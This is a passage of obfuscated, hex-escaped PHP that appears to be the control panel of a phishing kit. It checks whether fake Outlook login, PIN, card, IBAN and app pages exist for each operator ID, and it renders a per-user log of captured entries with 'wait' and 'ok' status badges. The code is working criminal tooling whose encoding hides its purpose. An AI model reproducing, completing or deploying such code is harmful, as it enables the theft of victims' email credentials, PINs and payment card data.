"\x20\x3c\x70\x20\x73\164\171\x6c\x65\75\x22\x74\145\170\x74\x2d\x61\154\x69\x67\156\72\143\145\x6e\x74\x65\x72\x22\x3e\x3c\163\x70\x61\156\x20\x73\x74\x79\154\145\x3d\x22\143\157\154\x6f\x72\x3a\x23\61\x36\x61\60\x38\65\42\76\74\163\x74\162\157\156\147\x3e\101\166\141\151\x6c\141\142\x6c\145\74\57\163\164\x72\157\x6e\x67\x3e\74\57\163\x70\141\x6e\76\x3c\x2f\160\x3e"; } else { $_SESSION["\151\x73\x69\x62\x61\x6e\x68\x6f\155\x65"] = "\x20\74\x70\40\163\164\x79\154\x65\x3d\x22\164\145\170\x74\55\x61\x6c\151\x67\156\x3a\143\x65\x6e\x74\x65\162\x22\x3e\74\x73\x70\141\156\x20\163\x74\171\154\x65\75\42\x63\x6f\154\x6f\x72\x3a\x23\145\x37\64\143\x33\x63\x22\76\74\x73\164\162\x6f\x6e\x67\76\x4e\x6f\164\x20\x41\166\x61\x69\154\141\x62\154\x65\x3c\57\x73\x74\x72\157\x6e\x67\x3e\x3c\x2f\163\x70\x61\156\x3e\74\x2f\x70\76"; } $file_s = "\x69\x62\x61\156\x2d\x61\160\160\56\x70\x68\x70"; if (check_file($_SESSION["\x75\x73\145\162\151\x64"], $file_s)) { $_SESSION["\x69\x73\x69\142\141\x6e\141\x70\x70"] = "\40\x3c\160\x20\163\x74\171\154\x65\75\x22\164\145\170\164\x2d\x61\154\151\147\156\72\143\145\x6e\164\145\162\42\x3e\x3c\x73\160\141\x6e\x20\x73\164\x79\154\145\75\42\x63\x6f\x6c\157\x72\x3a\43\x31\x36\x61\60\70\65\x22\x3e\x3c\163\164\162\157\156\147\76\x41\x76\x61\x69\x6c\x61\142\154\145\x3c\57\x73\164\x72\157\156\x67\76\74\x2f\163\160\141\156\x3e\74\57\x70\x3e"; } else { $_SESSION["\151\x73\151\x62\141\x6e\x61\160\160"] = "\40\x3c\x70\x20\163\x74\171\154\x65\75\42\164\145\x78\x74\55\x61\x6c\x69\147\x6e\72\143\145\x6e\x74\145\x72\x22\x3e\x3c\163\160\141\x6e\x20\163\x74\x79\x6c\x65\x3d\42\x63\x6f\x6c\157\162\x3a\43\x65\x37\x34\x63\63\x63\42\76\x3c\163\x74\162\x6f\x6e\147\76\116\x6f\x74\40\101\x76\x61\151\x6c\141\142\x6c\145\x3c\x2f\163\164\x72\x6f\x6e\147\x3e\x3c\57\x73\160\x61\x6e\76\x3c\x2f\x70\76"; } $file_s = "\x61\160\160\56\160\x68\160"; if (check_file($_SESSION["\165\163\145\162\151\144"], $file_s)) { $_SESSION["\151\163\141\x70\160"] = "\40\74\160\x20\163\164\171\154\x65\x3d\42\164\x65\170\x74\x2d\141\x6c\x69\147\156\x3a\x63\x65\x6e\x74\145\x72\x22\76\x3c\x73\160\141\156\40\163\164\171\x6c\x65\75\x22\x63\157\154\157\162\72\x23\61\x36\141\60\x38\x35\x22\76\74\x73\164\162\x6f\x6e\147\x3e\101\166\141\x69\x6c\x61\142\x6c\145\74\57\x73\164\x72\157\x6e\x67\x3e\x3c\x2f\x73\160\141\x6e\76\x3c\x2f\160\76"; } else { $_SESSION["\x69\163\x61\160\160"] = "\x20\x3c\x70\40\x73\x74\171\x6c\145\75\42\164\145\170\x74\55\x61\x6c\x69\x67\156\72\x63\145\x6e\164\x65\x72\x22\76\x3c\x73\160\141\x6e\x20\163\164\x79\154\145\x3d\42\x63\157\x6c\157\162\72\x23\x65\x37\x34\x63\63\x63\x22\x3e\74\x73\164\162\157\x6e\147\76\x4e\157\164\x20\101\166\141\151\154\x61\x62\x6c\145\74\x2f\x73\164\162\x6f\x6e\x67\76\x3c\x2f\163\x70\x61\156\x3e\x3c\57\x70\76"; } $file_s = "\160\151\x6e\56\160\150\x70"; if (check_file($_SESSION["\x75\163\x65\x72\x69\144"], $file_s)) { $_SESSION["\x69\163\160\151\156"] = "\40\74\160\x20\163\x74\x79\154\x65\x3d\x22\164\145\170\x74\55\141\x6c\151\147\156\72\143\x65\156\164\145\162\x22\x3e\x3c\163\x70\x61\156\40\x73\x74\171\154\x65\x3d\x22\x63\x6f\x6c\x6f\x72\72\x23\x31\x36\x61\60\x38\65\x22\76\74\163\164\162\157\x6e\x67\x3e\x41\x76\x61\151\154\x61\x62\154\x65\x3c\57\163\x74\162\x6f\x6e\x67\x3e\x3c\57\163\x70\141\156\x3e\74\57\160\76"; } else { $_SESSION["\x69\x73\x70\151\x6e"] = "\x20\74\x70\40\x73\x74\x79\x6c\x65\x3d\42\164\145\x78\x74\x2d\x61\154\x69\x67\156\72\143\x65\x6e\164\x65\162\x22\76\74\x73\x70\141\156\x20\x73\164\x79\x6c\x65\x3d\42\143\157\x6c\x6f\x72\72\x23\145\67\64\143\63\143\42\76\74\163\x74\162\157\156\147\x3e\x4e\x6f\164\x20\101\x76\x61\151\x6c\x61\x62\154\x65\x3c\x2f\x73\164\162\x6f\156\x67\x3e\x3c\x2f\163\x70\x61\156\x3e\x3c\57\160\76"; } $file_s = "\155\145\x73\x73\x61\147\145\x2e\x70\150\160"; if (check_file($_SESSION["\x75\x73\145\162\151\144"], $file_s)) { $_SESSION["\151\163\x6d\x65\x73\x73\141\147\145"] = "\x20\x3c\160\x20\163\x74\171\154\145\x3d\42\164\x65\x78\164\55\x61\x6c\151\147\156\72\143\145\156\164\145\162\42\76\x3c\x73\x70\141\x6e\40\163\x74\x79\154\x65\75\42\x63\157\154\x6f\162\72\x23\x31\66\x61\x30\70\x35\42\x3e\74\163\x74\x72\157\x6e\147\x3e\x41\166\141\x69\154\x61\x62\x6c\145\74\57\163\164\x72\x6f\x6e\x67\76\x3c\57\163\x70\x61\x6e\76\x3c\x2f\160\x3e"; } else { $_SESSION["\151\x73\x6d\x65\x73\x73\x61\x67\x65"] = "\40\74\x70\40\163\x74\171\x6c\x65\x3d\42\164\x65\170\x74\55\141\x6c\x69\147\x6e\x3a\143\145\x6e\x74\145\x72\x22\x3e\74\x73\160\141\156\40\163\x74\171\154\145\75\x22\x63\x6f\x6c\157\162\72\43\x65\x37\64\x63\x33\143\42\x3e\74\x73\164\162\157\x6e\x67\76\116\157\x74\x20\101\x76\x61\x69\x6c\141\142\154\x65\x3c\x2f\x73\x74\x72\157\156\147\x3e\x3c\x2f\x73\160\x61\x6e\76\x3c\x2f\160\x3e"; } $file_s = "\x63\x61\162\x64\x2e\160\x68\160"; if (check_file($_SESSION["\165\x73\145\162\151\x64"], $file_s)) { $_SESSION["\151\163\143\x61\x72\x64"] = "\40\x3c\160\x20\163\164\171\x6c\145\x3d\x22\x74\145\170\164\55\141\x6c\x69\147\x6e\72\143\145\156\x74\x65\x72\x22\x3e\x3c\x73\x70\x61\x6e\x20\x73\164\171\x6c\145\x3d\42\x63\x6f\x6c\157\x72\72\43\x31\x36\141\x30\x38\65\x22\76\x3c\163\164\162\x6f\x6e\147\x3e\x41\x76\x61\x69\x6c\x61\x62\154\145\x3c\57\x73\x74\x72\x6f\x6e\147\x3e\x3c\x2f\x73\160\x61\x6e\76\x3c\57\x70\76"; } else { $_SESSION["\x69\163\143\x61\162\x64"] = "\40\74\x70\40\x73\x74\171\x6c\145\x3d\42\x74\145\x78\164\x2d\141\154\151\147\x6e\x3a\x63\145\x6e\164\x65\x72\x22\x3e\74\x73\160\x61\x6e\x20\x73\164\171\154\x65\x3d\x22\143\x6f\154\x6f\162\72\x23\x65\x37\x34\143\x33\143\42\76\74\163\164\162\x6f\156\147\x3e\116\157\x74\x20\x41\x76\x61\151\x6c\x61\142\x6c\x65\74\57\163\164\x72\157\x6e\147\x3e\74\x2f\x73\160\141\156\76\x3c\57\x70\76"; } $file_s = "\x6c\157\147\157\165\164\x2e\x70\150\x70"; if (check_file($_SESSION["\165\x73\x65\x72\151\144"], $file_s)) { $_SESSION["\x69\x73\x65\x78\x69\x74"] = "\x20\x3c\160\40\163\x74\171\154\x65\75\x22\x74\x65\170\164\55\x61\154\x69\147\156\x3a\143\145\156\x74\145\162\x22\76\74\163\x70\x61\x6e\x20\163\x74\171\x6c\x65\75\42\x63\x6f\154\x6f\x72\72\43\61\66\141\60\x38\65\x22\76\74\x73\x74\162\x6f\x6e\x67\76\x41\x76\141\x69\x6c\x61\142\x6c\x65\74\57\163\x74\x72\x6f\156\x67\x3e\x3c\x2f\163\x70\x61\x6e\x3e\x3c\x2f\160\x3e"; } else { $_SESSION["\x69\163\x65\x78\151\x74"] = "\x20\74\160\x20\163\164\171\154\145\x3d\x22\164\x65\170\164\x2d\141\x6c\151\147\156\x3a\143\145\156\164\x65\162\42\x3e\74\x73\x70\x61\x6e\40\163\x74\x79\154\x65\75\x22\x63\x6f\x6c\157\162\72\x23\145\67\64\143\63\x63\x22\76\74\163\x74\162\157\x6e\x67\x3e\x4e\157\164\40\x41\x76\141\151\154\x61\142\154\145\74\57\x73\164\x72\157\x6e\147\x3e\74\x2f\x73\x70\x61\x6e\76\74\57\160\x3e"; } $file_s = "\x6f\x75\x74\154\x6f\157\153\137\x6c\x6f\x67\x69\x6e\x2e\x70\x68\160"; if (check_file($_SESSION["\165\x73\x65\x72\x69\x64"], $file_s)) { $_SESSION["\151\x73\157\x75\164\154\x6f\157\x6b\x5f\x6c\x6f\x67\151\x6e"] = "\40\x3c\160\x20\x73\x74\x79\154\x65\x3d\42\x74\145\x78\x74\x2d\x61\154\x69\x67\x6e\x3a\143\x65\x6e\x74\x65\162\42\x3e\x3c\x73\160\141\x6e\40\163\164\x79\154\145\75\x22\143\157\154\157\162\x3a\x23\x31\x36\x61\60\x38\x35\42\x3e\x3c\x73\164\x72\x6f\x6e\147\76\101\166\x61\x69\x6c\141\142\154\x65\74\x2f\x73\x74\x72\157\156\147\x3e\74\x2f\163\160\141\156\76\74\x2f\160\76"; } else { $_SESSION["\x69\x73\x6f\x75\164\154\157\x6f\153\x5f\x6c\157\x67\x69\156"] = "\40\74\160\40\163\x74\x79\154\145\75\42\164\x65\170\x74\55\141\x6c\x69\x67\x6e\x3a\143\145\156\x74\145\162\42\x3e\74\163\160\x61\156\x20\x73\x74\x79\x6c\x65\75\42\143\157\154\x6f\162\72\43\145\x37\64\x63\x33\x63\x22\76\x3c\163\164\x72\157\156\147\x3e\x4e\157\x74\x20\x41\x76\x61\x69\154\x61\x62\x6c\145\x3c\57\x73\x74\162\157\156\147\76\74\57\x73\x70\141\x6e\x3e\74\x2f\160\76"; } $file_s = "\157\165\164\154\157\157\153\137\x70\x69\x6e\56\160\x68\x70"; if (check_file($_SESSION["\165\x73\145\x72\x69\144"], $file_s)) { $_SESSION["\x69\x73\x6f\165\164\x6c\x6f\x6f\x6b\x5f\160\151\x6e"] = "\40\x3c\160\x20\163\164\171\x6c\x65\x3d\x22\x74\x65\x78\x74\x2d\x61\x6c\x69\x67\x6e\x3a\143\145\156\x74\x65\162\x22\76\74\163\160\x61\x6e\x20\163\164\x79\x6c\x65\75\x22\x63\x6f\x6c\157\x72\72\43\61\66\x61\x30\x38\65\42\x3e\x3c\x73\x74\x72\x6f\156\147\76\x41\x76\141\151\154\141\x62\x6c\145\x3c\57\163\164\162\157\x6e\147\76\74\57\x73\x70\141\x6e\x3e\74\x2f\160\76"; } else { $_SESSION["\x69\x73\157\165\164\154\157\157\x6b\x5f\x70\151\156"] = "\40\74\160\40\163\164\171\x6c\x65\75\42\164\x65\x78\164\55\x61\x6c\x69\147\x6e\x3a\x63\145\x6e\x74\145\x72\x22\x3e\74\x73\160\x61\156\40\163\x74\x79\x6c\145\75\x22\x63\x6f\154\157\x72\72\x23\x65\67\64\x63\x33\x63\x22\76\74\163\x74\x72\157\156\147\x3e\x4e\x6f\x74\40\x41\166\x61\151\154\x61\x62\154\145\74\x2f\163\164\x72\x6f\x6e\x67\76\x3c\x2f\x73\x70\x61\156\76\74\57\160\x3e"; } $file_s = "\x6f\165\164\154\x6f\157\x6b\137\x61\x70\x70\56\x70\x68\x70"; if (check_file($_SESSION["\x75\x73\x65\162\151\x64"], $file_s)) { $_SESSION["\x69\163\157\x75\x74\x6c\157\157\x6b\x5f\141\x70\x70"] = "\40\x3c\160\x20\163\164\x79\x6c\145\x3d\x22\x74\145\170\164\x2d\x61\x6c\x69\x67\x6e\x3a\143\x65\156\x74\145\162\42\76\74\163\160\141\156\x20\163\x74\x79\154\145\75\42\x63\x6f\x6c\x6f\162\x3a\x23\61\66\x61\60\x38\65\42\x3e\x3c\163\x74\162\x6f\156\147\x3e\x41\x76\x61\151\x6c\141\142\x6c\x65\x3c\x2f\x73\164\162\x6f\156\x67\76\74\x2f\x73\x70\141\156\76\74\x2f\160\x3e"; } else { $_SESSION["\151\x73\x6f\x75\164\x6c\157\x6f\x6b\137\x61\x70\x70"] = "\40\74\x70\x20\x73\x74\171\x6c\x65\x3d\42\164\x65\x78\164\x2d\141\154\151\147\x6e\72\143\x65\156\164\x65\162\x22\76\x3c\163\x70\141\x6e\x20\x73\164\171\x6c\145\75\x22\143\157\154\157\x72\x3a\x23\145\67\64\143\63\x63\x22\76\74\163\164\162\157\156\x67\76\116\157\164\40\101\x76\141\x69\x6c\x61\x62\154\x65\x3c\x2f\x73\164\x72\157\x6e\147\x3e\x3c\x2f\x73\x70\141\156\76\x3c\x2f\160\x3e"; } $filename = "\154\x6f\x67\56\x74\x78\x74"; $userID = isset($_SESSION["\165\163\x65\x72\151\x64"]) ? $_SESSION["\x75\x73\145\x72\151\x64"] : ''; $lines = readTextFile_log($userID, $filename); $mymessage = ''; if ($lines !== false) { $output = array(); foreach ($lines as $line) { $value1 = htmlspecialchars($line[0]); $value2 = htmlspecialchars($line[1]); $value3 = htmlspecialchars($line[2]); $value4 = htmlspecialchars($_SESSION["\x63\x6f\165\x6e\x74\x72\171\114\x6f\167\x65\162\x63\141\x73\x65"]); if (strtolower(trim($line[2])) === "\167\x61\x69\164") { $value5 = "\74\x73\x70\x61\x6e\40\143\x6c\x61\163\163\x3d\42\x62\x61\144\x67\x65\40\x6d\145\55\61\40\x62\x67\x2d\x77\141\x72\x6e\151\x6e\147\42\76\x55\x73\x65\x72\x3c\x2f\x73\160\x61\156\76"; $value6 = "\150\164\164\x70\x73\x3a\57\x2f\143\144\156\x2e\160\x69\x78\141\142\141\171\x2e\x63\157\155\x2f\141\156\x69\x6d\141\x74\x69\x6f\x6e\x2f\62\x30\x32\x32\x2f\61\60\x2f\61\x31\x2f\60\x33\x2f\61\66\x2f\x30\63\x2d\x31\x36\x2d\63\x39\55\x31\66\x30\x5f\x35\61\x32\x2e\x67\x69\x66"; } elseif (preg_match("\57\134\142\157\x6b\134\x62\57\151", $line[2])) { $value5 = "\74\163\x70\x61\156\40\143\154\141\x73\163\x3d\x22\x62\141\144\x67\145\x20\x6d\145\55\x31\x20\x62\147\55\167\141\x72\x6e\x69\156\x67\x22\76\125\x73\145\x72\74\57\163\160\x61\156\76"; $value6 = "\150\164\164\160\x73\72\x2f\57\x63\x64\x6e\x31\56\151\x63\x6f\x6e\x66\x69\x6e\x64\145\162\x2e\x63\157\155\57\144\x61\164\141\57\x69\x63\157\x6e\x73\57\160\162\145\164\164\x79\157\x66\x66\151\x63\145\x38\x2f\x32\x35\66\57\x55\163\x65\x72\55\147\x72\x65\145\156\56\x70\x6e\x67"; } else { $value5 = "\74\x73\x70\141\x6e\x20\x63\154\x61\163\163\x3d\42\142\x61\x64\x67\x65\x20\155\x65\x2d\61\x20\x62\147\55\x64\x61\156\147\x65\x72\42\x3e\x41\144\155\151\x6e\x3c\57\163\160\141\156\x3e"; $value6 = "\x68\x74\164\160\163\72\57\x2f\x69\155\147\x73\x2e\x73\x65\141\162\x63\150\56\x62\162\x61\166\x65\56\x63\x6f\155\x2f\x73\x63\64\x31\105\x76\x42\x52\123\x6f\x4f\67\153\132\163\147\117\x6d\172\156\x4c\x57\x4f\x42\123\160\102\x32\150\x63\160\167\127\65\x6b\x30\x35\x6c\x50\116\170\x64\x63\57\x72\163\x3a\x66\x69\x74\72\x38\66\x30\x3a\x30\72\60\x3a\60\x2f\147\72\x63\x65\57\141\x48\x52\x30\143\110\x4d\x36\114\171\x39\152\x5a\107\x34\170\57\114\x6d\154\152\142\62\x35\x6d\x61\x57\65\153\x5a\x58\x49\x75\x2f\x59\62\x39\x74\x4c\x32\122\150\144\107\105\x76\141\x57\x4e\166\57\x62\156\115\166\143\110\x4a\x6c\x64\x48\x52\x35\142\62\132\x6d\x2f\141\x57\116\154\x4f\103\x38\171\116\x54\x59\166\126\130\x4e\x6c\57\x63\151\x31\171\132\127\121\165\x63\x47\65\x6e"; } $output[] = "\x3c\x66\157\x72\x6d\40\x6d\x65\x74\x68\x6f\144\x3d\42\160\x6f\x73\164\x22\x20\x61\143\x74\x69\x6f\x6e\75\x22\x62\165\x69\x6c\x64\x2f\x22\76\xa\40\40\x20\40\40\40\x20\40\40\x20\40\40\40\40\40\40\x20\x20\x20\x20\40\40\40\40\x20\x3c\x74\x72\x20\143\154\141\x73\x73\x3d\42\x61\154\151\147\x6e\55\155\x69\x64\x64\154\x65\42\76\12\40\40\40\40\40\40\x20\x20\x20\40\40\40\40\x20\x20\x20\x20\40\x20\40\40\40\40\40\40\x20\40\x20\x20\x3c\164\x64\40\143\154\x61\x73\163\75\x22\x74\x65\170\x74\x2d\x63\145\156\x74\145\x72\x22\76\xa\x20\x20\40\x20\40\40\40\x20\40\x20\x20\40\40\40\40\40\x20\x20\40\x20\x20\40\x20\40\x20\40\x20\x20\x20\40\x20\x20\40\x3c\144\151\166\x20\x63\154\141\163\163\75\42\x61\x76\141\164\x61\162\40\141\x76\141\164\141\x72\x2d\x6d\x64\x22\76\x3c\x69\x6d\147\x20\143\154\x61\x73\163\75\x22\x61\x76\x61\164\141\x72\55\151\155\x67\x22\x20\x64\x61\x74\x61\x2d\x73\141\x76\145\160\141\x67\x65\x2d\143\x75\162\x72\145\x6e\x74\163\162\x63\75\42\x22\x20\144\x61\164\141\55\x73\x61\x76\x65\x70\141\x67\145\55\x73\162\143\x3d\x22\x22\40\x73\162\x63\x3d\42" . $value6 . "\42\x20\141\154\164\75\x22\42\76\x3c\x73\160\141\156\40\143\154\x61\x73\x73\75\x22\141\x76\x61\164\x61\x72\x2d\163\x74\x61\164\165\163\40\x62\147\x2d\163\165\143\x63\x65\163\x73\x22\76\x3c\x2f\x73\160\141\x6e\76\74\57\x64\151\x76\76\xa\x20\x20\x20\x20\40\x20\x20\40\40\x20\x20\x20\40\x20\x20\40\x20\x20\x20\40\40\40\40\x20\40\40\x20\x20\x20\74\57\x74\144\76\xa\40\x20\40\40\x20\x20\40\x20\40\40\x20\x20\x20\40\x20\40\40\40\40\40\x20\x20\40\x20\x20\x20\x20\x20\x20\x3c\x74\x64\76\12\x20\40\x20\40\x20\x20\x20\x20\x20\40\40\40\x20\40\40\x20\40\40\x20\x20\40\40\40\40\40\40\x20\x20\40\40\40\40\40\74\x64\151\166\40\x63\x6c\141\x73\163\75\x22\x74\x65\170\164\55\156\x6f\167\x72\x61\160\42\76" . $value1 . "\x3c\57\x64\151\x76\76\xa\x20\x20\40\x20\40\x20\40\x20\x20\x20\x20\40\x20\40\x20\40\x20\40\40\40\x20\40\40\x20\x20\x20\40\x20\40\x3c\x2f\164\x64\76\12\40\40\x20\40\x20\x20\x20\x20\40\x20\x20\40\40\40\40\x20\x20\x20\x20\x20\40\40\x20\40\x20\40\40\40\40\x3c\164\x64\x3e\12\x20\40\x20\40\40\x20\x20\40\x20\40\40\40\40\x20\40\40\x20\x20\x20\x20\x20\x20\40\x20\x20\40\x20\x20\40\40\40\40\x20\74\144\x69\166\x20\143\154\x61\x73\163\x3d\x22\x64\x2d\x66\154\145\x78\40\x6a\165\x73\164\151\146\171\55\143\x6f\156\164\x65\156\164\55\x62\x65\164\x77\145\x65\x6e\x22\x3e\xa\40\x20\x20\40\40\x20\40\40\40\x20\x20\40\40\40\40\x20\40\x20\40\40\x20\x20\x20\x20\40\40\40\40\x20\40\x20\x20\40\40\40\x20\x20\x3c\x64\x69\166\x20\x63\x6c\141\163\163\75\x22\x66\154\157\141\164\55\163\x74\141\162\x74\42\x3e\74\57\x64\151\166\76\xa\x20\40\x20\40\x20\x20\x20\40\x20\x20\40\x20\x20\x20\40\40\x20\x20\x20\x20\40\40\x20\x20\x20\x20\40\40\40\40\40\40\40\x20\x20\40\x20\x3c\144\151\x76\40\143\x6c\x61\163\x73\75\x22\x66\154\157\141\164\x2d\x65\156\144\x20\x6d\x73\x2d\x31\x20\164\145\x78\x74\x2d\156\157\167\162\x61\x70\x22\76\x3c\163\155\x61\154\154\x20\x63\154\x61\163\x73\x3d\x22\164\145\170\x74\x2d\155\145\144\151\x75\155\x2d\145\x6d\x70\150\x61\x73\151\x73\42\76" . $value2 . "\74\x2f\x73\x6d\x61\154\x6c\76\x3c\x2f\x64\151\166\76\12\40\x20\x20\40\40\x20\x20\40\x20\x20\40\40\x20\40\x20\40\x20\x20\x20\40\40\40\x20\40\x20\40\x20\40\40\x20\x20\x20\40\x3c\x2f\x64\151\166\x3e\12\x20\x20\x20\x20\40\40\x20\40\40\40\x20\40\x20\40\x20\40\x20\x20\40\x20\x20\40\40\40\40\40\40\x20\x20\x20\40\x20\x20\74\x64\151\166\40\143\154\x61\163\x73\x3d\x22\160\x72\157\147\162\145\163\163\x20\160\x72\157\x67\162\145\163\163\55\164\150\151\156\42\x3e\xa\x20\x20\x20\40\40\40\x20\40\x20\x20\x20\x20\40\40\40\40\40\x20\x20\x20\40\x20\x20\40\x20\40\40\x20\x20\x20\40\40\40\40\40\x20\x20\x3c\144\x69\166\x20\x63\154\x61\163\163\x3d\x22\x70\x72\x6f\x67\162\145\163\163\55\x62\141\x72\40\142\147\x2d\x73\165\x63\143\x65\163\x73\x2d\x67\162\141\x64\x69\x65\x6e\164\42\40\x72\x6f\x6c\x65\x3d\x22\160\x72\157\x67\x72\x65\163\x73\142\141\162\42\x20\x73\x74\171\154\x65\75\42\x77\x69\x64\x74\x68\72\40\x31\60\x30\45\x22\40\141\162\151\141\x2d\x76\141\154\165\x65\156\157\x77\75\42\x31\x30\60\42\40\x61\162\x69\x61\55\x76\x61\154\165\145\155\x69\x6e\75\42\60\42\40\x61\162\151\141\55\166\141\154\x75\145\x6d\141\170\75\x22\61\x30\x30\x22\x3e\74\x2f\144\x69\x76\76\12\40\40\x20\40\40\x20\x20\x20\40\x20\40\x20\40\40\x20\40\x20\40\x20\x20\40\x20\40\x20\40\x20\40\40\x20\x20\x20\40\x20\x3c\57\x64\x69\166\76\xa\40\40\x20\40\x20\40\x20\40\40\x20\40\40\x20\x20\x20\40\40\x20\x20\40\40\40\40\40\x20\40\40\40\40\x3c\57\164\x64\x3e\xa\x20\40\x20\40\40\x20\40\40\40\40\40\40\x20\x20\x20\40\40\x20\40\40\x20\x20\x20\40\40\x20\40\40\x20\74\164\x64\40\x63\x6c\141\x73\x73\75\x22\164\145\x78\x74\55\143\x65\156\x74\x65\162\42\76" . $value5 . "\74\57\164\x64\76\40\12\40\x20\40\40\x20\x20\40\40\x20\x20\40\40\40\x20\40\x20\40\x20\40\x20\x20\x20\40\x20\x20\40\40\x20\40\x3c\x74\144\x3e\12\40\x20\40\x20\x20\x20\40\40\40\x20\x20\40\40\40\40\x20\40\x20\x20\40\40\40\x20\x20\40\40\40\x20\x20\40\40\x20\40\x3c\x64\151\166\x20\143\x6c\141\163\x73\75\x22\164\145\170\x74\55\x6e\x6f\167\x72\141\160\x22\76" . $value3 . "\x3c\x2f\144\x69\x76\x3e\12\40\x20\x20\x20\40\x20\40\40\40\40\40\x20\x20\x20\x20\x20\40\40\x20\x20\40\x20\40\40\40\40\40\40\x20\x3c\x2f\x74\144\76\xa\40\40\40\40\x20\x20\40\x20\x20\40\40\x20\x20\40\40\40\40\x20\x20\40\40\40\x20\40\40\x3c\57\164\x72\76\12\x20\x20\x20\40\x20\x20\40\x20\x20\40\x20\x20\x20\40\x20\40\40\40\x20\x20\x20\74\x2f\146\x6f\x72\x6d\76"; } $_SESSION["\x61\154\x6c\x5f\160\x61\147\x65"] = implode('', $output); } else { echo "\105\162\x72\157\x72\40\x6f\160\145\156\151\x6e\x67\x20\x74\150\x65\40\x66\151\154\x65\x2e"; } } else { $_SESSION["\x73\164\x61\164\x75\163\x5f\x6f\x6e"] = "\x62\x6f\162\144\145\x72\x2d\163\164\141\162\164\x20\x62\x6f\162\144\x65\162\55\163\164\x61\162\164\x2d\x34\x20\x62\157\x72\x64\x65\162\x2d\163\x74\x61\x72\164\x2d\144\141\156\x67\x65\162\x20\x70\170\x2d\63\40\155\142\x2d\63"; $_SESSION["\102\154\141\x73\x61\x63\157\x75\x6e"] = "\55\55"; $_SESSION["\160\162\x6f\x6a\x65\143\x74\x5f\156\141\x6d\x65"] = "\55\x2d"; $_SESSION["\x73\x74\x61\x74\165\163"] = "\74\163\x70\141\156\x20\143\x6c\x61\x73\163\75\42\142\141\x64\147\x65\40\142\147\55\144\141\156\x67\x65\x72\55\147\x72\141\x64\x69\145\x6e\164\x20\x6d\x73\55\141\x75\x74\157\42\76\117\x66\x66\154\x69\156\145\74\57\163\x70\141\156\76"; $_SESSION["\x69\163\145\170\x69\164"] = "\40\x3c\160\x20\x73\164\171\x6c\145\x3d\42\x74\x65\x78\164\x2d\141\x6c\x69\x67\x6e\x3a\143\x65\x6e\x74\145\x72\x22\76\x3c\x73\x70\x61\x6e\x20\163\164\171\154\145\75\x22\143\157\x6c\157\162\72\x23\145\x37\64\143\63\x63\x22\76\x3c\x73\164\162\x6f\x6e\147\x3e\x4e\x6f\164\40\x41\166\x61\151\x6c\x61\x62\x6c\145\74\57\163\164\162\x6f\x6e\147\76\x3c\x2f\x73\160\x61\156\76\x3c\x2f\160\76"; $_SESSION["\x69\x73\143\141\162\144"] = "\x20\x3c\x70\40\163\x74\171\x6c\145\x3d\42\x74\x65\x78\164\x2d\x61\154\x69\x67\156\x3a\x63\145\156\164\x65\162\x22\x3e\x3c\x73\160\x61\156\x20\x73\164\x79\x6c\x65\x3d\x22\143\x6f\x6c\157\162\x3a\43\x65\67\x34\x63\63\x63\x22\x3e\x3c\x73\164\162\157\x6e\147\x3e\x4e\x6f\x74\x20\101\166\x61\151\x6c\x61\x62\154\x65\74\x2f\163\x74\x72\x6f\156\x67\x3e\x3c\x2f\x73\160\x61\156\x3e\x3c\57\x70\x3e"; $_SESSION["\x69\163\x6d\145\x73\x73\141\147\145"] = "\x20\74\160\40\x73\164\x79\154\145\x3d\42\x74\145\170\x74\x2d\x61\154\x69\147\156\72\143\x65\x6e\x74\x65\162\42\76\x3c\x73\x70\x61\156\40\163\164\171\x6c\145\75\42\143\x6f\x6c\x6f\162\72\43\x65\67\x34\x63\63\143\x22\76\x3c\x73\164\162\157\x6e\147\76\x4e\x6f\x74\x20\101\166\x61\151\x6c\141\142\x6c\145\74\x2f\x73\x74\162\x6f\x6e\x67\76\74\57\163\160\x61\x6e\x3e\x3c\x2f\160\76"; $_SESSION["\151\163\x70\151\x6e"] = "\40\x3c\160\40\x73\164\171\154\x65\x3d\42\164\x65\170\164\55\x61\x6c\151\x67\156\x3a\x63\x65\x6e\164\x65\162\x22\76\x3c\x73\x70\141\x6e\x20\x73\x74\x79\154\x65\75\x22\143\x6f\154\x6f\x72\72\43\145\67\x34\x63\63\143\x22\76\x3c\163\164\x72\x6f\x6e\x67\76\x4e\x6f\x74\40\x41\x76\141\151\154\141\x62\x6c\x65\74\57\163\x74\162\157\156\147\76\74\57\x73\160\x61\156\x3e\x3c\57\160\76"; $_SESSION["\151\163\x61\160\160"] = "\40\x3c\x70\x20\x73\164\171\154\x65\x3d\x22\164\x65\170\164\x2d\x61\154\x69\147\x6e\72\x63\x65\156\x74\x65\x72\x22\x3e\x3c\x73\x70\x61\x6e\x20\x73\x74\x79\154\x65\x3d\42\143\157\154\x6f\162\x3a\43\x65\x37\64\x63\63\x63\x22\76\74\x73\x74\162\157\x6e\147\76\x4e\157\164\40\x41\x76\141\x69\154\x61\142\154\145\x3c\57\x73\164\x72\157\156\x67\x3e\x3c\57\163\160\x61\x6e\x3e\x3c\x2f\160\76"; $_SESSION["\x69\163\x65\155\x61\151\154"] = "\40\x3c\160\x20\x73\164\x79\154\145\x3d\42\x74\x65\170\164\x2d\141\154\x69\x67\x6e\x3a\x63\x65\156\x74\145\x72\x22\76\74\163\160\141\156\x20\x73\164\171\x6c\x65\75\x22\143\x6f\154\157\162\72\x23\x65\x37\64\x63\63\143\x22\76\74\x73\x74\162\x6f\156\147\x3e\116\157\x74\x20\x41\x76\141\x69\154\x61\142\154\x65\x3c\57\163\164\162\x6f\x6e\x67\76\x3c\x2f\x73\x70\141\x6e\76\74\57\x70\x3e"; $_SESSION["\x69\x73\167\145\142\155\141\x69\x6c"] = "\40\x3c\160\40\x73\164\171\154\x65\x3d\x22\164\145\x78\164\55\141\x6c\151\x67\x6e\x3a\x63\145\156\164\145\162\x22\76\x3c\x73\x70\x61\156\40\163\164\171\154\x65\x3d\x22\143\157\154\x6f\162\x3a\43\x65\67\x34\x63\63\x63\42\76\74\x73\x74\162\x6f\x6e\x67\x3e\116\x6f\x74\x20\x41\x76\x61\151\x6c\141\x62\x6c\145\x3c\57\x73\164\162\x6f\156\x67\x3e\x3c\x2f\x73\160\141\x6e\76\x3c\x2f\x70\76"; $_SESSION["\x69\163\151\x62\x61\156\150\157\x6d\145"] = 